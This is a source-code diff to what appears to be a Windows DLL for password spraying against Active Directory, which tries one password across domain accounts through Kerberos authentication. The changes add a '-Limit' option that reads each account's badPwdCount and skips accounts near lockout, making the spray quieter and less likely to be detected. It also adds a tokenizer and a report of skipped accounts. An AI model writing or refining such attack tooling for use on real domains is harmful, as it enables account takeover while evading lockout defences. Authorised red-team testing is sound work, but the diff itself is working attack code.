@@ -183,7 +183,8 @@ BOOL LogonUserSSPI(LPWSTR pszSSP, LPWSTR pszAuthority, LPWSTR pszPrincipal, LPWS
 }
 
 HRESULT SprayUsers(IDirectorySearch *pContainerToSearch,	// IDirectorySearch pointer to Partitions container.
-	LPCWSTR lpSprayPasswd)									// Password to Spray.
+	LPCWSTR lpSprayPasswd,					// Password to Spray.
+	INT limit)						// Password to Spray.
 {
 	if (!pContainerToSearch)
 		return E_POINTER;
@@ -249,10 +250,11 @@ HRESULT SprayUsers(IDirectorySearch *pContainerToSearch,	// IDirectorySearch poi
 	LPOLESTR szSID = NULL;
 	LPOLESTR szDSGUID = new WCHAR[39];
 	LPGUID pObjectGUID = NULL;
-	LPWSTR pszPropertyList = { L"sAMAccountName" };
+	LPWSTR pszPropertyList[] = { L"badPwdCount", L"sAMAccountName"};
 	DWORD dwAccountsTested = 0;
 	DWORD dwAccountsFailed = 0;
 	DWORD dwAccountsSuccess = 0;
+	int SkippedAccountsCount = 0;
 
 	typedef struct _USER_INFO {
 		WCHAR chuserPrincipalName[500][MAX_PATH];
@@ -275,7 +277,7 @@ HRESULT SprayUsers(IDirectorySearch *pContainerToSearch,	// IDirectorySearch poi
 	{
 		// Return specified properties
 		hr = pContainerToSearch->ExecuteSearch(pszSearchFilter,
-			&pszPropertyList,
+			pszPropertyList,
 			sizeof(pszPropertyList) / sizeof(LPOLESTR),
 			&hSearch);
 	}
@@ -290,15 +292,26 @@ HRESULT SprayUsers(IDirectorySearch *pContainerToSearch,	// IDirectorySearch poi
 			{
 				// Keep track of count.
 				iCount++;
-					
+				BOOL lockRisk = false;
+	
 				// Loop through the array of passed column names, print the data for each column
-				while (pContainerToSearch->GetNextColumnName(hSearch, &pszColumn) != S_ADS_NOMORE_COLUMNS)
+				while (pContainerToSearch->GetNextColumnName(hSearch, &pszColumn) != S_ADS_NOMORE_COLUMNS && !lockRisk)
 				{
 					hr = pContainerToSearch->GetColumn(hSearch, pszColumn, &col);
 					if (SUCCEEDED(hr))
 					{
 						switch (col.dwADsType)
 						{
+							case ADSTYPE_INTEGER:
+								for (x = 0; x < col.dwNumValues; x++) {
+									if (_wcsicmp(col.pszAttrName, L"badPwdCount") == 0) {
+										if (limit != 0 && col.pADsValues->Integer >= limit ) {
+											lockRisk = true;
+											SkippedAccountsCount = SkippedAccountsCount + 1;
+											break;
+										}
+									}
+								}
 							case ADSTYPE_DN_STRING:
 							case ADSTYPE_CASE_EXACT_STRING:
 							case ADSTYPE_CASE_IGNORE_STRING:
@@ -340,7 +353,6 @@ HRESULT SprayUsers(IDirectorySearch *pContainerToSearch,	// IDirectorySearch poi
 								}
 								break;
 							case ADSTYPE_BOOLEAN:
-							case ADSTYPE_INTEGER:
 							case ADSTYPE_OCTET_STRING:
 							case ADSTYPE_UTC_TIME:
 							case ADSTYPE_LARGE_INTEGER:
@@ -386,12 +398,34 @@ HRESULT SprayUsers(IDirectorySearch *pContainerToSearch,	// IDirectorySearch poi
 	wprintf(L"Total AD accounts tested: %d\n", dwAccountsTested);
 	wprintf(L"Failed Kerberos authentications: %d\n", dwAccountsFailed);
 	wprintf(L"Successful Kerberos authentications: %d\n", dwAccountsSuccess);
+	wprintf(L"Accounts skipped by exceeding the BadPwdCount threshold of %d attempts: %d\n",limit, SkippedAccountsCount);
 	wprintf(L"--------------------------------------------------------------------\n");
 
 	delete[] pszSearchFilter;
 	return hr;
 }
 
+wchar_t* multi_tok(wchar_t* input, wchar_t* delimiter) {
+	static wchar_t* string;
+	if (input != NULL)
+		string = input;
+
+	if (string == NULL)
+		return string;
+
+	wchar_t* end = wcsstr(string, delimiter);
+	if (end == NULL) {
+		wchar_t* temp = string;
+		string = NULL;
+		return temp;
+	}
+
+	wchar_t* temp = string;
+
+	*end = '\0';
+	string = end + wcslen(delimiter);
+	return temp;
+}
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
 {
@@ -399,6 +433,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
 	LPWSTR pwszParams = (LPWSTR)calloc(strlen((LPSTR)lpReserved) + 1, sizeof(WCHAR));
 	size_t convertedChars = 0;
 	size_t newsize = strlen((LPSTR)lpReserved) + 1;
+	INT limit = 4;
 
 	switch (dwReason)
 	{
@@ -413,7 +448,14 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
 
 			// Handle the command line arguments.
 			mbstowcs_s(&convertedChars, pwszParams, newsize, (LPSTR)lpReserved, _TRUNCATE);
-
+			
+			if (wcsstr(pwszParams, L" -Limit ")) {
+				
+				wchar_t* password = multi_tok(pwszParams, L" -Limit ");
+				limit = _wtoi(multi_tok(NULL, L" -Limit "));
+				pwszParams = password;
+			}
+			
 			// Get Domainame.
 			DWORD dwRet = DsGetDcName(NULL, NULL, NULL, NULL, 0, &pdcInfo);
 			if (dwRet != ERROR_SUCCESS) {
@@ -487,8 +529,9 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
 
 					if (SUCCEEDED(hr))
 					{
-						hr = SprayUsers(pContainerToSearch, // IDirectorySearch pointer to Partitions container.
-							pwszParams						// Password to Spray.
+						hr = SprayUsers(pContainerToSearch, 	// IDirectorySearch pointer to Partitions container.
+							pwszParams,			// Password to Spray.
+							limit				// BadPwdCount limit
 						);
 						if (SUCCEEDED(hr))
 						{
